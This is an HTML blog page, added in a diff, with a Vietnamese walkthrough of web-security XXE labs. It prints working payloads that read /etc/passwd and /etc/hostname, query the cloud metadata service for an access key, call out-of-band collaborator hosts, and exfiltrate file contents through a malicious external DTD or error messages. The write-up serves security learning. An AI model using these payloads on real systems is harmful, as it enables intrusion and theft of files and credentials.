@@ -1,0 +1,698 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>XXE-lab - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Full XML external entity (XXE) injection Exploiting XXE using external entities to retrieve files  Bài này không có filter gì cả và chức năng chính là check trong kho hàng có còn hàng không với yêu cầu gửi lên là 1 dữ liệu XML     Khi mà xác định sẽ trả ra có bao nhiêu cơ sở có sản phầm này
+  Bây giờ thì chúng ta bắt request này:">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/posts\/2024-01-17-xxe-lab\/",
+          "name": "Xxe lab"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "XXE-lab",
+  "description" : "Full XML external entity (XXE) injection Exploiting XXE using external entities to retrieve files  Bài này không có filter gì cả và chức năng chính là check trong kho hàng có còn hàng không với yêu cầu gửi lên là 1 dữ liệu XML     Khi mà xác định sẽ trả ra có bao nhiêu cơ sở có sản phầm này\n  Bây giờ thì chúng ta bắt request này:",
+  "inLanguage" : "en",
+  "wordCount":  1569 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese, XXE" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/posts\/2024-01-17-xxe-lab\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="XXE-lab" />
+<meta property="og:description" content="Full XML external entity (XXE) injection Exploiting XXE using external entities to retrieve files  Bài này không có filter gì cả và chức năng chính là check trong kho hàng có còn hàng không với yêu cầu gửi lên là 1 dữ liệu XML     Khi mà xác định sẽ trả ra có bao nhiêu cơ sở có sản phầm này
+  Bây giờ thì chúng ta bắt request này:">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/posts/2024-01-17-xxe-lab/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="XXE-lab" />
+  <meta name="twitter:description" content="Full XML external entity (XXE) injection Exploiting XXE using external entities to retrieve files  Bài này không có filter gì cả và chức năng chính là check trong kho hàng có còn hàng không với yêu …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              
+                <h1>XXE-lab</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="full-xml-external-entity-xxe-injectionhttps"><a href="https://">Full XML external entity (XXE) injection</a></h1>
+<h2 id="exploiting-xxe-using-external-entities-to-retrieve-fileshttps"><a href="https://">Exploiting XXE using external entities to retrieve files</a></h2>
+<ul>
+<li>Bài này không có filter gì cả và chức năng chính là check trong kho hàng có còn hàng không với yêu cầu gửi lên là 1 dữ liệu XML</li>
+<li><img src="https://hackmd.io/_uploads/SkhHAdhhp.png" alt="image"></li>
+</ul>
+<ul>
+<li>
+<p>Khi mà xác định sẽ trả ra có bao nhiêu cơ sở có sản phầm này</p>
+</li>
+<li>
+<p>Bây giờ thì chúng ta bắt request này:</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/HkFF0Onha.png" alt="image"></p>
+</li>
+<li>
+<p>Đúng như chúng ta dự đoán thì khi mà check sẽ gửi xml này :-1:</p>
+</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;stockCheck&gt;
+ productId&gt;1&lt;/productId&gt;
+ &lt;storeId&gt;2&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><ul>
+<li>
+<p>XML này sẽ chứa giá trị của productId và storeId và khi đến sever sẽ dùng xml parse file này sẽ nhận được các giá trị này để xử lí tiếp</p>
+</li>
+<li>
+<p>Đây là 2 file js thực hiện gửi xml</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/ryZEkF23p.png" alt="image"></p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/SkrE1K2na.png" alt="image"></p>
+</li>
+<li>
+<p>Bây giờ chúng ta sẽ khai báo 1 DTD để khi parse sever sẽ load thêm Entity và chúng ta khai báo và gán giá trị</p>
+</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;&amp;xxe;&lt;/storeId&gt;&lt;/stockCheck&gt;
+
+</code></pre><ul>
+<li>
+<p>có thể hiểu ở đây chúng ta khai báo DTD test và trong đó có 1 entity xxe gán giá trị là nội dung của file etc/passwd hay nói cách khác là thực thể này sử dụng hệ thống file để truy cập vào tệp /etc/passwd trên hệ thống mục tiêu. thì khi đó để lấy được giá trị này ta sẽ lấy là storeId &amp;xxe; để hiển thị kết quả.</p>
+</li>
+<li>
+<p>Và 3 2 1 bùm:</p>
+</li>
+<li>
+<p>Chúng ta đã nhận được kết quả mặc dù sever thông báo lỗi productID, hihi có vẻ check này khá là lỏng lẻo</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/H11Kgt2hp.png" alt="image"></p>
+</li>
+<li>
+<p>Và mình đã solve được bài lab này.
+<img src="https://hackmd.io/_uploads/SyQ3eK3ha.png" alt="image"></p>
+</li>
+</ul>
+<h2 id="exploiting-xxe-to-perform-ssrf-attackshttps"><a href="https://">Exploiting XXE to perform SSRF attacks</a></h2>
+<ul>
+<li>
+<p>Theo đề bài của bài này thì mình đoán là chúng ta sẽ lợi dụng việc parse của sever để thực hiện 1 thao tác nào đó trong nội bộ.</p>
+</li>
+<li>
+<p>Và thêm một gợi ý của đề bài nữa là:</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/Sk45bth2T.png" alt="image"></p>
+</li>
+<li>
+<p>thì đây là endpoint chứa dư liệu như là phiên bản và trong đó chắc chắn có dữ liệu nhạy cảm :&gt; vậy nên ta sẽ SSRF ở chỗ này</p>
+</li>
+<li>
+<p>Chức năng và cách thức load cũng giống y hệt như bài ở trên nên mình sẽ bắt request luôn</p>
+</li>
+<li>
+<p>đầu tiên em sẽ sử dụng payload:</p>
+</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/&quot;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;
+1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><ul>
+<li>Đoạn này em sẽ khai báo 1 DTD và trong đó chứa một entity xxe sẽ lấy giá trị trong http://169.254.169.254/ của hệ thống và nhận thấy sever sẽ trả ra giá trị ở producId cho chúng ta biết nên em sẽ dùng <code>&amp;xxe;</code> để lấy giá trị của nó</li>
+<li><img src="https://hackmd.io/_uploads/HkUjQFhnp.png" alt="image"></li>
+<li>Như chúng ta có thể thấy là sever báo lỗi không đúng productId và hiển thị thêm latest thì có vẻ đây chưa phải là điểm cuối của endpoint này</li>
+<li>Chúng ta search thêm thì tìm được</li>
+<li><img src="https://hackmd.io/_uploads/By_E4Yh2p.png" alt="image"></li>
+<li>Nên bây giờ thêm <code>latest/meta-data/</code> vào điểm cuối</li>
+</ul>
+<pre><code>ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+events/
+hostname
+iam/
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups
+services/
+
+</code></pre><ul>
+<li>Ta cuối cùng tìm được điểm cuối
+<img src="https://hackmd.io/_uploads/r1FCEYhha.png" alt="image"></li>
+<li>Nhận được <code>SecretAccessKey</code> là <code>1GhxmetMso4KEDmB70aHfPmkRRRimHBfRNPFxttg</code></li>
+<li>Và cuối cùng ta đã giải quyết được bài này</li>
+<li><img src="https://hackmd.io/_uploads/BkgMHFn3p.png" alt="image"></li>
+</ul>
+<h2 id="-blind-xxe-with-out-of-band-interactionhttps"><a href="https://"> Blind XXE with out-of-band interaction</a></h2>
+<ul>
+<li>Đây là một bài Blind OOB- hiểu nôm na là sẽ phải nhận được kết quả ở chỗ khác thường là sever của chúng ta:&lt;</li>
+<li>Có vẻ đây là một bài để chúng ta tiếp cận OOB thôi cho nên chúng ta chỉ cần làm cho nó tương tác được là được.</li>
+<li>Chức năng cũng là check Stock với productId và vì vậy chúng ta sẽ sử dụng burp collaborator để bắt DNS</li>
+<li>Payload:</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://bbqig22iesj1hsf6pkyarrtdf4lv9pxe.oastify.com&quot;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;2&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><ul>
+<li>
+<p>Chúng ta tạo 1 DTD là stockCheck và trong đó có 1 entity sẽ load đến domain của chúng ta</p>
+</li>
+<li>
+<p>Kết quả nhận được là invalid productId</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/SyDiuYn3T.png" alt="image"></p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/SyC3uY33a.png" alt="image"></p>
+</li>
+<li>
+<p>Và chúng ta đã giải quyết được bài này</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/B1wZtYhhT.png" alt="image"></p>
+</li>
+</ul>
+<h2 id="blind-xxe-with-out-of-band-interaction-via-xml-parameter-entitieshttps"><a href="https://">Blind XXE with out-of-band interaction via XML parameter entities</a></h2>
+<ul>
+<li>Đây cũng là 1 bài OOB sẽ nâng cấp hơn bài trên 1 chút là chúng ta dùng &amp;xxe; sẽ bị block và giải pháp là dùng %xxe;</li>
+<li>Payload :-1:</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE stockCheck [ &lt;!ENTITY % xxe SYSTEM &quot;http://bbqig22iesj1hsf6pkyarrtdf4lv9pxe.oastify.com&quot;&gt; %xxe; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;2&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><p><img src="https://hackmd.io/_uploads/ByjN9F2np.png" alt="image"></p>
+<ul>
+<li>
+<p>Đầu tiên như bài trên sẽ bị chặn</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/HymQjY3na.png" alt="image"></p>
+</li>
+<li>
+<p>Thay thành payload như trên:</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/HyOYsF2ha.png" alt="image"></p>
+</li>
+<li>
+<p>Chúng ta sẽ nhận được thông tin parse error nhưng trước lúc này ở DNS đã được trỏ tới và ta nhận được request
+<img src="https://hackmd.io/_uploads/Bk63jthnT.png" alt="image"></p>
+</li>
+<li>
+<p>Vậy là chúng ta đã solve được bài lab</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/rJE0sK22p.png" alt="image"></p>
+</li>
+</ul>
+<h2 id="exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtdhttps"><a href="https://">Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></h2>
+<ul>
+<li>chức năng của bài này cũng tương tự như những bài trên và có yêu cầu là lấy được nội dung của file etc/passwd</li>
+<li>Đầu tiên ta có thể thấy là đây là 1 bài blind nên sẽ không thể lấy được kết quả trực tiếp</li>
+<li>Bây giờ dúng ta sẽ sử dụng 1 file DTD ở sever khác và load nó vào trong sever mình, kĩ thuật này có nhiều điểm tối ưu như là vượt qua được các black list của sever</li>
+<li>Payload :-1:</li>
+<li>Trên sever của mình tạo 1 file</li>
+</ul>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre><ul>
+<li>theo cách hiểu của mình thì file này sẽ khởi tạo 2 entity :-1:</li>
+<li>Đầu tiên là entity file sẽ lấy nội dung của file etc/passwd</li>
+<li>Tiếp theo là entity eval trong đó định nghĩa 1 paramter entity %attack; có chức năng query đến domain attacker đang host kèm theo nội dung của %file; thông qua tham số x.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJrP152hT.png" alt="image"></p>
+<ul>
+<li>bây giờ thì khai báo dtd này ở trong tài liệu xml của chúng ta</li>
+<li>Payload:</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a9e001d04f751b9805d43df01cf0040.exploit-server.net/e.dtd&quot;&gt; %xxe;]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><ul>
+<li>Nhận được kết quả parse error</li>
+<li><img src="https://hackmd.io/_uploads/Skrxlq3n6.png" alt="image"></li>
+</ul>
+<p>Check trong burp collabrator ở đây em dùng sever luôn
+<img src="https://hackmd.io/_uploads/Bk9Qbc3ha.png" alt="image"></p>
+<ul>
+<li>và submit giá trị: <code>1371734627ca</code></li>
+<li><img src="https://hackmd.io/_uploads/r1Lr-chh6.png" alt="image"></li>
+<li>và đã hoàn thành bài lab.</li>
+</ul>
+<h2 id="exploiting-blind-xxe-to-retrieve-data-via-error-messageshttps"><a href="https://">Exploiting blind XXE to retrieve data via error messages</a></h2>
+<ul>
+<li>Bài này trong có vẻ khá giống với bài ở trên nhưng mà sever sẽ thông báo trực tiếp lỗi nằm ở phần nào thay vì parse XML error như các bài trên.</li>
+<li>Bây giờ chúng ta sẽ tạo 1 file dtd ở sever của mình :ab:</li>
+</ul>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre><ul>
+<li>
+<p>Phân tích một chút là dtd này chứa 2 entity 1 là file sẽ load nội dung của etc/passwd</p>
+</li>
+<li>
+<p>2 là eval lại chứa thêm 1 param entity sẽ load file gán thêm cả giá trị của %file nữa.</p>
+</li>
+<li>
+<p>Như chúng ta biết khi mà load sai 1 file thì sẽ báo sai tên file như trường hợp này cũng vậy</p>
+</li>
+<li>
+<p>Triển khai:</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/Hkhx5q23T.png" alt="image"></p>
+</li>
+<li>
+<p>Sau đó gọi đến dtd</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/Sk1Ji9nh6.png" alt="image"></p>
+</li>
+<li>
+<p>em nhận được nội dung file etc/passwd và bài lab được giải quyết
+<img src="https://hackmd.io/_uploads/rJhlic336.png" alt="image"></p>
+</li>
+</ul>
+<h2 id="exploiting-xinclude-to-retrieve-fileshttps"><a href="https://">Exploiting XInclude to retrieve files</a></h2>
+<ul>
+<li>
+<p>Ở bài lab này, body của POST request Check stock không phải một XML nữa mà chỉ chứa các tham số: productId và storeId.</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/Bk7t35nnp.png" alt="image"></p>
+</li>
+<li>
+<p>Như vậy, ta không thể thực hiện cách tấn công thông thường như trên nữa vì không thể control toàn bộ XML được xử lí. Do đó, ta sẽ sử dụng XInclude vào bất kì trường nào để include payload vào.</p>
+</li>
+<li>
+<p>Để tấn công thành công, ta cần reference XInclude namespace và đường dẫn file cần đọc, ở đây là /etc/passwd.</p>
+</li>
+</ul>
+<pre><code>&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
+</code></pre><ul>
+<li>Chèn payload trên vào trường productId, ta thấy kết quả trả về nội dung file /etc/passwd thành công.</li>
+<li><img src="https://hackmd.io/_uploads/rkt-Rcnha.png" alt="image">
+<img src="https://hackmd.io/_uploads/Bykf0c336.png" alt="image"></li>
+</ul>
+<h2 id="exploiting-xxe-via-image-file-uploadhttps"><a href="https://">Exploiting XXE via image file upload</a></h2>
+<ul>
+<li>Bắt đầu bài lab, mình có thể thấy là bài này dùng upload file khác với tất cả những bài trên và không hề có 1 dấu hiệu nào liên quan đến xml</li>
+<li><img src="https://hackmd.io/_uploads/SJGCSs326.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/SkjRSinna.png" alt="image"></li>
+<li>Ta có thể nhìn thấy khi comment sẽ có 1 chức năng là upload file kèm theo</li>
+<li>mình sẽ bắt bằng burp</li>
+<li><img src="https://hackmd.io/_uploads/BywLLi2nT.png" alt="image"></li>
+<li>Đọc thêm trên payload all the thing mình thấy có thể chèn xml trên svg và có vẻ như trang web cho upload file này</li>
+<li><img src="https://hackmd.io/_uploads/H1r1Oo2nT.png" alt="image"></li>
+</ul>
+<p>payload :-1:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+</code></pre><ul>
+<li>Lưu ý là phải chuyển content-type thành image/svg+xml để có thể load được tài liệu xml</li>
+<li>Mở ảnh ra và ta thấy</li>
+<li><img src="https://hackmd.io/_uploads/r17Wush26.png" alt="image"></li>
+<li>Nội dung của file là :1234: <code>b53672a39ba7</code></li>
+<li>Submit và solve bài lab:</li>
+<li><img src="https://hackmd.io/_uploads/rJG8djnh6.png" alt="image"></li>
+</ul>
+<h2 id="exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtdhttps"><a href="https://">Exploiting XXE to retrieve data by repurposing a local DTD</a></h2>
+<ul>
+<li>
+<p><img src="https://hackmd.io/_uploads/Hk5osih2T.png" alt="image"></p>
+</li>
+<li>
+<p>chức năng checkStock tương tự các bài ở trên để check sản phẩm</p>
+</li>
+<li>
+<p>Như gợi ý thì ta thấy hệ thống sử dụng máy tính Gnome thường có DTD là docbookx.dtd và chứa 1 thực thể gọi là ISOamso</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/ryk_hs2h6.png" alt="image"></p>
+</li>
+<li>
+<p>Chúng ta sẽ sử dụng parameter như các bài trước để load Entity này</p>
+</li>
+<li>
+<p>Payload :-1:</p>
+</li>
+</ul>
+<pre><code>&lt;!DOCTYPE message [
+&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+&lt;!ENTITY % ISOamso '
+&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'&gt;
+%local_dtd;
+]&gt;
+</code></pre><ul>
+<li>Khởi tạo 1 dtd message trong đó chứa entity local_dtd ghi giá trị file <code>/usr/share/yelp/dtd/docbookx.dtd</code> entity ISOamso, và file ghi giá trị file etc/passwd, cuối cùng là eval chứa entity error sẽ load 1 file không tồn tại với thêm vào tên là tham chiếu đến file</li>
+<li>Và dựa vào thông báo lỗi ta có thể đánh cắp được giá trị của file /etc/passwd</li>
+<li>3 2 1 &hellip;. BÙM:</li>
+<li><img src="https://hackmd.io/_uploads/HkOoTihhT.png" alt="image"></li>
+<li>Và chúng ta đã hoàn thành bài lab.</li>
+<li><img src="https://hackmd.io/_uploads/HJt26o3hp.png" alt="image"></li>
+</ul>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/xxe/">XXE</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/posts/2024-11-21-liferaypentest/" data-toggle="tooltip" data-placement="top" title="Liferay Pentest">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
